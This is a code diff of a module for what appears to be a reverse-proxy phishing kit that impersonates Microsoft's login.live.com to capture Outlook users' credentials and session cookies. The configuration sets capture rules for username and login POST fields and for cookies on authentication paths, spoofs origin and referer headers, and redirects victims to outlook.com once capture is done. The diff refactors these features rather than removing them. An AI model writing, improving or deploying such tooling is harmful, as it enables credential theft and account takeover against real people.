@@ -10,17 +10,6 @@ const globalWorker = process.HOOK_JS_MODULE
 
 
 /** Important Defaults */
-const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {
-
-    constructor(proxyEndpoint, browserReq) {
-        super(proxyEndpoint, browserReq)
-    }
-
-    processRequest() {
-        return super.processRequest()
-
-    }
-}
 
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
@@ -95,28 +84,6 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
-        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
-
-
-        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
-        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'login.live.com') : ''
-        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'login.live.com') : ''
-
-        // this.req.headers['accept-encoding'] = 'gzip, br'
-        if (this.req.method === 'POST') {
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            // if (this.req.url.startsWith('/ppsecure/post.srf?')) {
-            //     super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            //     clientContext.setLogAvailable(true)
-            // }
-        }
-
-        if (this.req.url.startsWith('/identity/confirm')) {
-            clientContext.currentDomain = 'account.live.com'
-
-        }
-
-
         // Check for redirect
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
@@ -131,15 +98,9 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 return super.exitLink('https://outlook.com')
             }
         }
-        
+    
 
-        if (this.req.url === '/auth0/outlook/owa2') {
-            super.sendClientData(clientContext, {})
-            this.res.writeHead('301', { location: 'https://outlook.com' })
-            return super.cleanEnd('PHP-EXEC', clientContext)
-        }
-
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+        return super.execute(clientContext)
 
     }
 }
@@ -149,30 +110,57 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 const configExport = {
     CURRENT_DOMAIN: 'login.live.com',
+    
+    SCHEME: 'outlook',
 
-    EXTERNAL_FILTERS: 
-    [
+    START_PATH: '/', 
+
+    AUTOGRAB_CODE: 'username',
+
+
+    COOKIE_PATH: ['/auth0/outlook/owa2', '/common/SAS/ProcessAuth', '/ping/v5767687'],
+
+    EXIT_TRIGGER_PATH: ['/auth0/outlook/owa2'],
+
+    EXIT_URL: 'https://outlook.com',
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/identity/confirm',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'account.live.com',
+                persistent: true,
+                },
+        },
+
+        {
+            path: '/GetCredentialType.srf.*',
+            command: 'DONOT_SEND_INFO',
+            command_args: {},
+        },
+
+    ],
+
+    EXTERNAL_FILTERS: [
         'account.live.com',
         'login.live.com'
     ],
 
-    AUTOGRAB_CODE: 'username',
+    PRE_HANDLERS:[],
 
-    START_PATH: '/', //'/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
-    PRE_HANDLERS:
-        [
-        ],
-    PROXY_REQUEST: ProxyRequest,
+    PROXY_REQUEST: 'DEFAULT',
+    
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
     CAPTURES: {
         loginUserName: {
-            method: 'POST',
             params: ['username'],
-            urls: '',
             hosts: ['login.live.com'],
         },
+
         loginID: {
             method: 'POST',
             params: ['login'],
@@ -194,15 +182,15 @@ const configExport = {
             hosts: ['login.live.com'],
         },
 
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
-
     },
-    cookieKEY: 'loginUsername'
+    
+     //MODULE OPTIONS 
+     MODULE_ENABLED: true,
+
+     MODULE_OPTIONS: {
+         startPath: this.START_PATH,
+         exitLink: '',
+     },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
